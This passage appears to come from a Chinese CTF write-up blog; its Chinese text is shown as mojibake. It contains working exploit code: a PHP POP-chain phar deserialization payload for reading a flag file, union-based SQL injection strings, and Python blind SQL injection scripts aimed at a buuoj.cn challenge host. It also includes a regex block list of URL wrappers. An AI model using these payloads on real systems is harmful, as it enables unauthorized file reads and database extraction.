</span></span><span class="line"><span class="cl">        <span class="p">}</span> 
</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>class.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">C1e4r</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$test</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Show</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>   <span class="c1">//$this-&gt;source = phar://phar.jpg
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span><span class="p">[</span><span class="s1">&#39;str&#39;</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__set</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span><span class="nv">$value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$key</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">_show</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">highlight_file</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/http|https|file:|gopher|dict|\.\./i&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;hacker~&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="s2">&#34;index.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Test</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$params</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">get</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span><span class="p">[</span><span class="nv">$key</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$value</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span><span class="p">[</span><span class="nv">$key</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$value</span> <span class="o">=</span> <span class="s2">&#34;index.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_get</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">file_get</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$text</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$value</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$text</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰“popé“¾åŠ pharååºåˆ—åŒ–</p>
<p>å…ˆæ‰¾åˆ©ç”¨ç‚¹<code>Test</code>ç±»é‡Œé¢çš„<code>file_get</code>å‡½æ•°èƒ½è¯»å–æ–‡ä»¶å†…å®¹ï¼Œè¦è§¦å‘<code>__get</code>æ–¹æ³•ï¼Œæ‰¾åˆ°<code>show</code>ç±»é‡Œé¢çš„<code>__toString</code>ç„¶ååœ¨<code>C1e4r</code>ç±»é‡Œé¢æœ‰echoè§¦å‘</p>
<p>exp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">C1e4r</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Show</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span><span class="p">[</span><span class="s1">&#39;str&#39;</span><span class="p">]</span><span class="o">=</span><span class="k">new</span> <span class="nx">Test</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Test</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$params</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;source&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;/var/www/html/f1ag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$o</span><span class="o">=</span><span class="k">new</span> <span class="nx">C1e4r</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$o</span><span class="o">-&gt;</span><span class="na">str</span><span class="o">=</span><span class="k">new</span> <span class="nx">Show</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//ç”Ÿæˆpharæ—¶ï¼Œæ–‡ä»¶çš„åç¼€åå¿…é¡»ä¸ºphar
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="c1">//è®¾ç½®stub
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s1">&#39;GIF89a&#39;</span><span class="o">.</span><span class="s1">&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifestï¼Œè¿™ä¸ªæ˜¯åˆ©ç”¨çš„é‡ç‚¹
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶å¯ä»¥ä¸å­˜åœ¨ï¼Œä½†è¿™å¥è¯­å¥ä¸èƒ½å°‘
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//ç­¾åè‡ªåŠ¨è®¡ç®—
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸Šä¼ åæŸ¥çœ‹uploadè·¯ç”±</p>
<p>ç„¶ååœ¨file.phpé‡Œé¢æœ‰file_existså‡½æ•°å¯ä»¥è§¦å‘ååºåˆ—åŒ–</p>
<h2 id="october-2019-twice-sql-injection">October 2019 Twice SQL Injection
</h2><p>é¢˜ç›®å«äºŒæ¬¡æ³¨å…¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; union select database()#
</span></span><span class="line"><span class="cl">1&#39; union select group_concat(table_name)from information_schema.tables
</span></span><span class="line"><span class="cl">where table_schema=database()#
</span></span><span class="line"><span class="cl">1&#39; union select group_concat(column_name)from
</span></span><span class="line"><span class="cl">information_schema.columns where table_name=&#39;flag&#39;#
</span></span><span class="line"><span class="cl">1&#39; union select (select group_concat(flag)from
</span></span><span class="line"><span class="cl">flag)#
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="gyctf2020ezsqli">[GYCTF2020]Ezsqli
</h2><p>æ— åˆ—åæ³¨å…¥</p>
<p>çˆ†è¡¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">logging</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># LOG_FORMAT = &#34;%(lineno)d - %(asctime)s - %(levelname)s - %(message)s&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT)</span>
</span></span><span class="line"><span class="cl"><span class="n">target</span><span class="o">=</span><span class="s2">&#34;http://1412c496-d04b-49dd-86ec-2e57fd4db8d0.node5.buuoj.cn:81/index.php&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">dataStr</span><span class="o">=</span><span class="s2">&#34;(select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database())&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">binaryTest</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">cu</span><span class="p">,</span><span class="n">comparer</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span> <span class="p">:</span> <span class="s2">&#34;0^(ascii(substr(</span><span class="si">{}</span><span class="s2">,</span><span class="si">{}</span><span class="s2">,1))</span><span class="si">{comparer}{}</span><span class="s2">)&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">dataStr</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="n">cu</span><span class="p">,</span><span class="n">comparer</span><span class="o">=</span><span class="n">comparer</span><span class="p">)})</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;Nu1L&#39;</span> <span class="ow">in</span> <span class="n">s</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">searchFriends_sqli</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">l</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="mi">255</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">l</span> <span class="o">&lt;=</span> <span class="n">r</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">cu</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span> <span class="o">+</span> <span class="n">r</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">binaryTest</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">cu</span><span class="p">,</span> <span class="s2">&#34;&lt;&#34;</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">cu</span> <span class="o">-</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="p">(</span><span class="n">binaryTest</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">cu</span><span class="p">,</span> <span class="s2">&#34;&gt;&#34;</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">            <span class="n">l</span> <span class="o">=</span> <span class="n">cu</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="p">(</span><span class="n">cu</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nb">chr</span><span class="p">(</span><span class="n">cu</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;start&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">finres</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">i</span><span class="o">=</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="kc">True</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">extracted_char</span> <span class="o">=</span> <span class="n">searchFriends_sqli</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">extracted_char</span> <span class="o">==</span> <span class="kc">None</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="n">finres</span> <span class="o">+=</span> <span class="n">extracted_char</span>
</span></span><span class="line"><span class="cl">        <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;(+) å½“å‰ç»“æœ:&#34;</span><span class="o">+</span><span class="n">finres</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;(+) è¿è¡Œå®Œæˆ,ç»“æœä¸º:&#34;</span><span class="p">,</span> <span class="n">finres</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>çˆ†flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://1412c496-d04b-49dd-86ec-2e57fd4db8d0.node5.buuoj.cn:81/index.php&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># give_grandpa_pa_pa_pa</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload_flag</span> <span class="o">=</span> <span class="s1">&#39;1^((1,</span><span class="se">\&#39;</span><span class="si">{}</span><span class="se">\&#39;</span><span class="s1">)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span><span class="c1">#è¿™é‡Œè¦sleepä¸€ä¸‹ï¼Œä¸ç„¶å¤ªå¿«äº†ä¼šä¹±ç ï¼Œæœ¬äººæµ‹è¯•å0.3æ­£å¥½èƒ½å‡ºç»“æœ</span>
